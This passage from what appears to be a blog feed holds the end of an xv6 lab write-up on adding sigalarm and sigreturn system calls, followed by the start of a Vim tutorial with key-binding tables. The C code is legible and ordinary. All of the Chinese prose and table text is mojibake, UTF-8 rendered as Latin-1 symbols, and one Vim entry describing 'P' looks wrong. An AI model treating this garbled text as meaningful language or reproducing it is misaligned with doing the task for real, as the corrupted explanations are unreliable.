sys_sleep,<br>[SYS_uptime]  sys_uptime,<br>[SYS_open]    sys_open,<br>[SYS_write]   sys_write,<br>[SYS_mknod]   sys_mknod,<br>[SYS_unlink]  sys_unlink,<br>[SYS_link]    sys_link,<br>[SYS_mkdir]   sys_mkdir,<br>[SYS_close]   sys_close,<br>[SYS_sigalarm] sys_sigalarm,<span class="hljs-comment">//</span><br>[SYS_sigreturn] sys_sigreturn,<span class="hljs-comment">//</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨sysproc.cä¸­åŠ å…¥sys_sigalarmå’Œsys_sigreturnå‡½æ•°å¤„ç†ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64 </span><br><span class="hljs-function"><span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint64 fn;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">1</span>, &amp;fn) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> sigalarm(n, (<span class="hljs-keyword">void</span>(*)())(fn));<br>&#125;<br><br><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> sigreturn();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å…³äºtest1çš„æç¤ºï¼š</p><ul><li>è§£å†³æ–¹æ¡ˆå°†è¦æ±‚æ‚¨ä¿å­˜å’Œæ¢å¤å¯„å­˜å™¨â€“ æ‚¨éœ€è¦ä¿å­˜å’Œæ¢å¤å“ªäº›å¯„å­˜å™¨æ‰èƒ½æ­£ç¡®åœ°æ¢å¤è¢«ä¸­æ–­çš„ä»£ç ï¼Ÿ(æç¤º: ä¼šæœ‰å¾ˆå¤š)ã€‚</li><li>å½“è®¡æ—¶å™¨å…³é—­æ—¶ï¼Œç”¨æˆ·é™·é˜±åœ¨ struct proc ä¸­ä¿å­˜è¶³å¤Ÿçš„çŠ¶æ€ï¼Œè¿™æ ·ç­¾åè¿”å›å°±å¯ä»¥æ­£ç¡®åœ°è¿”å›åˆ°è¢«ä¸­æ–­çš„ç”¨æˆ·ä»£ç ã€‚</li><li>é˜²æ­¢å¯¹å¤„ç†ç¨‹åºçš„é‡å…¥è°ƒç”¨â€”â€”å¦‚æœå¤„ç†ç¨‹åºè¿˜æ²¡æœ‰è¿”å›ï¼Œå†…æ ¸å°±ä¸åº”è¯¥å†æ¬¡è°ƒç”¨å®ƒã€‚</li></ul><p>ç¡¬ä»¶æ—¶é’Ÿæ¯æ¬¡éƒ½å¼ºåˆ¶æ‰§è¡Œä¸€ä¸ªä¸­æ–­ï¼Œè¿™ä¸ªä¸­æ–­åœ¨ kernel/trap.c ä¸­çš„ usertrap ()ä¸­å¤„ç†ã€‚æ¯æ¬¡æ—¶é’Ÿå‘ç”Ÿç¡¬ä»¶ä¸­æ–­ï¼Œéƒ½ç»Ÿè®¡ä¸€æ¬¡ï¼Œåˆ°äº†æ¬¡æ•°å°±æ‰§è¡Œhandler</p><p>åœ¨procä¸­åŠ å…¥å¦‚ä¸‹å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> alarm_interval; <span class="hljs-comment">//n in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">void</span>(*alarm_handler)();<span class="hljs-comment">// fn in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">int</span> alarm_ticks;<span class="hljs-comment">//after alarm_ticks will </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">saved_trapframe</span>;</span><br>  <span class="hljs-keyword">int</span> alarm_flag;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å®Œå–„sigalarmå’Œsigreturnå‡½æ•°ï¼Œå¹¶åœ¨defs.hä¸­åŠ å…¥å£°æ˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// defs.h</span><br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span> (*)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">//trap.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  p-&gt;alarm_interval=ticks;<br>  p-&gt;alarm_handler=handler;<br>  p-&gt;alarm_ticks=ticks;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  *p-&gt;trapframe = *p-&gt;saved_trapframe;<br>  p-&gt;alarm_flag = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>allocprocå‡½æ•°å’Œfreeprocå‡½æ•°ä¹Ÿéœ€è¦æ›´æ–°</p><ul><li>è¿›ç¨‹åˆ›å»ºå’Œé”€æ¯æ—¶ç»“æ„ä½“çš„å­—æ®µçš„è®¾ç½®</li></ul><p>å¯¹è¿›ç¨‹çš„å­—æ®µè¿›è¡Œåˆå§‹åŒ–å’Œé”€æ¯ä»¥åŠé¡µçš„ç”³è¯·</p><ul><li>ä½¿ç”¨kallocç»™p-&gt;saved_trapframeåˆ†é…ç©ºé—´</li><li>ä½¿ç”¨kfree((void *)p-&gt;saved_trapframe);é”€æ¯ç©ºé—´</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Look in the process table for an UNUSED proc.</span><br><span class="hljs-comment">// If found, initialize state required to run in the kernel,</span><br><span class="hljs-comment">// and return with p-&gt;lock held.</span><br><span class="hljs-comment">// If there are no free procs, or a memory allocation fails, return 0.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc*</span><br><span class="hljs-function"><span class="hljs-title">allocproc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state == UNUSED) &#123;<br>      <span class="hljs-keyword">goto</span> found;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>found:<br>  p-&gt;pid = allocpid();<br><br>  <span class="hljs-comment">// Allocate a trapframe page.</span><br>  <span class="hljs-keyword">if</span>((p-&gt;trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// An empty user page table.</span><br>  p-&gt;pagetable = proc_pagetable(p);<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>   <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span>((p-&gt;saved_trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// Set up new context to start executing at forkret,</span><br>  <span class="hljs-comment">// which returns to user space.</span><br>  <span class="hljs-built_in">memset</span>(&amp;p-&gt;context, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(p-&gt;context));<br>  p-&gt;context.ra = (uint64)forkret;<br>  p-&gt;context.sp = p-&gt;kstack + PGSIZE;<br><br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <br>  <span class="hljs-keyword">if</span>(p-&gt;saved_trapframe)<br>    kfree((<span class="hljs-keyword">void</span> *)p-&gt;saved_trapframe);<br>    <br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>  <br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯„åˆ†</p><p><img src="https://img.gls.show/img/b48525193508d98e10d9e31c3878fbf3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾â€”â€”Vim</title>
    <link href="/p/4f2baa62/"/>
    <url>/p/4f2baa62/</url>
    
    <content type="html"><![CDATA[<h1 id="Vimç®€ä»‹â€”â€”ç¼–è¾‘å™¨ä¹‹ç¥"><a href="#Vimç®€ä»‹â€”â€”ç¼–è¾‘å™¨ä¹‹ç¥" class="headerlink" title="Vimç®€ä»‹â€”â€”ç¼–è¾‘å™¨ä¹‹ç¥"></a>Vimç®€ä»‹â€”â€”ç¼–è¾‘å™¨ä¹‹ç¥</h1><p>Vimæ˜¯ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¢«ç§°ä¸ºç¼–è¾‘å™¨ä¹‹ç¥ï¼Œä½†ä¸ä¹‹å¼ºå¤§åŠŸèƒ½æ‰€å¯¹åº”çš„ï¼Œæ˜¯é™¡å³­çš„å­¦ä¹ æ›²çº¿</p><p>å¾ˆå¤šäººå­¦ä¹ Viméƒ½æ˜¯ä»å…¥é—¨åˆ°æ”¾å¼ƒï¼Œä¹‹åä¾¿å°†å…¶æŸä¹‹é«˜é˜ã€‚ä½†æ˜¯æŒæ¡ä¹‹åï¼Œä½ å°†æ„Ÿå—åˆ°Vimå“²å­¦ä¸æ•ˆç‡çš„å·¨å¤§æå‡</p><p><img src="/image/vim-tutorial/vim-1.jpg"></p><p>åœ¨å­¦ä¹ ä¹‹å‰éœ€è¦æ˜ç¡®çš„å‡ ç‚¹ï¼š</p><ul><li><p>å­¦ä¹ Vimåœ¨å¼€å§‹æ˜¯ç—›è‹¦çš„</p></li><li><p>åªæœ‰å¤šç”¨æ‰ä¼šç†Ÿç»ƒ</p></li><li><p>å…‹æœçš„ä¸€åˆ‡å›°éš¾éƒ½æ˜¯å€¼å¾—çš„</p></li></ul><p>ä¸‹é¢æ˜¯Vimçš„ä¸€ä¸ªå¿«é€Ÿä½¿ç”¨ç¤ºèŒƒï¼š</p><ul><li><p>åœ¨å‘½ä»¤è¡Œä¸­é”®å…¥<code>Vim 1.cpp</code>ï¼Œä¼šç›´æ¥è¿›å…¥Vimçš„æ™®é€šæ¨¡å¼ï¼ˆNormal Patternï¼‰ï¼Œæ­¤æ—¶æ˜¯æ— æ³•è¾“å…¥æ–‡å­—çš„</p></li><li><p>æŒ‰ä¸‹<code>i</code>ï¼Œä¾¿è¿›å…¥äº†ç¼–è¾‘æ¨¡å¼ï¼ˆInsert Patternï¼‰ï¼Œåœ¨ç¼–è¾‘æ¨¡å¼ä¸‹ï¼Œæ–¹å¯é”®å…¥æ–‡å­—</p></li><li><p>è¾“å…¥æ–‡å­—</p></li><li><p>æŒ‰ä¸‹<code>ESC</code>ï¼Œè¾“å…¥<code>:wq</code>ï¼Œæˆ‘ä»¬ä¾¿å›åˆ°äº†å‘½ä»¤è¡Œï¼Œå¹¶ä¸”æˆåŠŸå®Œæˆäº†æ–‡ä»¶çš„ç¼–è¾‘</p></li></ul><h1 id="Vimæ¨¡å¼"><a href="#Vimæ¨¡å¼" class="headerlink" title="Vimæ¨¡å¼"></a>Vimæ¨¡å¼</h1><p>åœ¨ä¸Šé¢æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒVimå…·æœ‰æ™®é€šæ¨¡å¼å’Œç¼–è¾‘æ¨¡å¼ï¼ˆè¿™æ˜¯æœ€å¸¸ç”¨çš„æ¨¡å¼ï¼‰ï¼Œä¸åŒçš„æ¨¡å¼å…·æœ‰ä¸åŒçš„ç‰¹ç‚¹ï¼Œè¿™æ˜¯Vimçš„ç‰¹æ€§ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬åˆå­¦ä¼šæ„Ÿå—åˆ°åˆ«æ‰­çš„åœ°æ–¹</p><p>åœ¨æ™®é€šæ¨¡å¼ä¸‹ä¸å¯ä»¥æ’å…¥æ–‡å­—ï¼Œåªèƒ½è¾“å…¥å‘½ä»¤ã€‚è¦æƒ³è¿›è¡Œç¼–è¾‘ï¼Œéœ€è¦åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼</p><p><img src="/image/vim-tutorial/image-20220103233026488.png" alt="æ¨¡å¼åˆ‡æ¢"></p><p>Vimæ‰“å¼€ä¹‹åå³è¿›å…¥æ™®é€šæ¨¡å¼ï¼Œ<strong>åœ¨Vimçš„æ™®é€šæ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰çš„é”®éƒ½æ˜¯åŠŸèƒ½é”®ã€‚</strong>å¯¹äºä»¥ä¸‹ä¸åŒæƒ…æ™¯çš„ç›®çš„ï¼Œæœ‰ä¸åŒçš„æŒ‰é”®å¸®åŠ©æˆ‘ä»¬æå‡æ•ˆç‡</p><p>å¯¹äºä»¥ä¸‹ç‰¹æ®Šæƒ…æ™¯ï¼Œä¸åŒçš„å¿«æ·é”®å¯ä»¥å¿«é€Ÿç§»åŠ¨å…‰æ ‡ã€‚æ¯”å¦‚è¾“å…¥2 Gï¼Œå³å¯ç§»åŠ¨åˆ°ç¬¬äºŒè¡Œ</p><h1 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h1><h2 id="ç§»åŠ¨åˆ°ç‰¹å®šä½ç½®ï¼š"><a href="#ç§»åŠ¨åˆ°ç‰¹å®šä½ç½®ï¼š" class="headerlink" title="ç§»åŠ¨åˆ°ç‰¹å®šä½ç½®ï¼š"></a><strong>ç§»åŠ¨åˆ°ç‰¹å®šä½ç½®ï¼š</strong></h2><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>0</td><td>å…‰æ ‡ç§»åŠ¨åˆ°è¡Œé¦–</td></tr><tr><td>$</td><td>å…‰æ ‡ç§»åŠ¨åˆ°è¡Œå°¾éƒ¨</td></tr><tr><td>gg</td><td>å…‰æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>G</td><td>å…‰æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶çš„æœ€åä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>n G</td><td>å…‰æ ‡ç§»åŠ¨åˆ°ç¬¬nè¡Œ</td></tr><tr><td>w</td><td>å…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸ªå•è¯çš„å¼€å§‹</td></tr><tr><td>e</td><td>å…‰æ ‡ç§»åŠ¨åˆ°æœ¬å•è¯æœ€åä¸€ä¸ªå­—æ¯</td></tr><tr><td>b</td><td>å…‰æ ‡ç§»åŠ¨åˆ°æœ¬å•è¯çš„ç¬¬ä¸€ä¸ªå­—æ¯</td></tr></tbody></table><p><strong>ä¸Šä¸‹å·¦å³ï¼š</strong></p><p>é™¤äº†ä¸Šä¸‹å·¦å³ç®­å¤´å¯ä»¥ç§»åŠ¨ä¹‹å¤–ï¼ŒVimæ”¯æŒä½¿ç”¨<code>hjkl</code>è¿›è¡Œå…‰æ ‡çš„ç§»åŠ¨ï¼Œåˆ†åˆ«å¯¹åº”</p><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>h æˆ– å·¦ç®­å¤´é”®</td><td>å…‰æ ‡å‘å·¦ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>j æˆ– å‘ä¸‹ç®­å¤´</td><td>å…‰æ ‡å‘ä¸‹ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>k æˆ– å‘ä¸Šç®­å¤´</td><td>å…‰æ ‡å‘ä¸Šç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>l æˆ– å‘å³ç®­å¤´</td><td>å…‰æ ‡å‘å³ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦</td></tr></tbody></table><h2 id="å­—ç¬¦ä¸²åŒ¹é…"><a href="#å­—ç¬¦ä¸²åŒ¹é…" class="headerlink" title="å­—ç¬¦ä¸²åŒ¹é…"></a><strong>å­—ç¬¦ä¸²åŒ¹é…</strong></h2><p>è¾“å…¥<code>/</code>ä¹‹åï¼Œå¯ä»¥è¾“å…¥<code>text</code>ï¼Œä¹‹åå…‰æ ‡ä¼šç§»åŠ¨åˆ°texté¦–æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œåœ¨è¿™ä¹‹åï¼š</p><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>n</td><td>å…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªtextå‡ºç°çš„åœ°æ–¹</td></tr><tr><td>N</td><td>å…‰æ ‡ç§»åŠ¨åˆ°å‰ä¸€ä¸ªtextå‡ºç°çš„åœ°æ–¹</td></tr></tbody></table><h2 id="æ›¿æ¢"><a href="#æ›¿æ¢" class="headerlink" title="æ›¿æ¢"></a><strong>æ›¿æ¢</strong></h2><p>æ™®é€šæ¨¡å¼ï¼Œå¯ä»¥æ›¿æ¢å•ä¸ªå­—æ¯ï¼Œæ–¹å¼å¾ˆç®€å•ï¼Œå…ˆæŒ‰ä¸‹rï¼Œç„¶åè¾“å…¥è¦æ›¿æ¢çš„å­—æ¯å³å¯</p><h2 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a><strong>åˆ é™¤</strong></h2><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>dw</td><td>åˆ é™¤å…‰æ ‡åˆ°ä¸‹ä¸ªå•è¯çš„å¼€å§‹å¤„æ‰€æœ‰æ–‡æœ¬</td></tr><tr><td>de</td><td>åˆ é™¤å…‰æ ‡åˆ°æœ¬å•è¯çš„ç»“æŸå¤„æ‰€æœ‰æ–‡æœ¬</td></tr><tr><td>d2w</td><td>åˆ é™¤å…‰æ ‡åˆ°åé¢ç¬¬äºŒä¸ªå•è¯çš„å¼€å§‹å¤„æ‰€æœ‰æ–‡æœ¬</td></tr></tbody></table><h2 id="æ’¤é”€"><a href="#æ’¤é”€" class="headerlink" title="æ’¤é”€"></a><strong>æ’¤é”€</strong></h2><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>u</td><td>æ’¤é”€</td></tr><tr><td>ctrl+r</td><td>æ’¤é”€ä½ çš„æ’¤é”€</td></tr></tbody></table><h2 id="æ‹·è´-ç²˜è´´"><a href="#æ‹·è´-ç²˜è´´" class="headerlink" title="æ‹·è´/ç²˜è´´"></a><strong>æ‹·è´/ç²˜è´´</strong></h2><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>yy</td><td>æ‹·è´å½“å‰è¡Œ</td></tr><tr><td>p</td><td>åœ¨å½“å‰ä½ç½®åé¢ç²˜è´´</td></tr><tr><td>P</td><td>åœ¨å½“å‰ä½ç½®çš„ä¸‹ä¸€è¡Œç²˜è´´</td></tr></tbody></table><h2 id="æ™®é€šæ¨¡å¼åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼"><a href="#æ™®é€šæ¨¡å¼åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼" class="headerlink" title="æ™®é€šæ¨¡å¼åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼"></a><strong>æ™®é€šæ¨¡å¼åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼</strong></h2><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>a</td><td>åœ¨å…‰æ ‡åæ’å…¥</td></tr><tr><td>o</td><td>åœ¨å½“å‰è¡Œåé¢æ’å…¥ä¸€ä¸ªæ–°è¡Œ</td></tr><tr><td>O</td><td>åœ¨å½“å‰è¡Œå‰é¢æ’å…¥ä¸€ä¸ªæ–°è¡Œ</td></tr></tbody></table><h2 id="ä¿å­˜-é€€å‡º"><a href="#ä¿å­˜-é€€å‡º" class="headerlink" 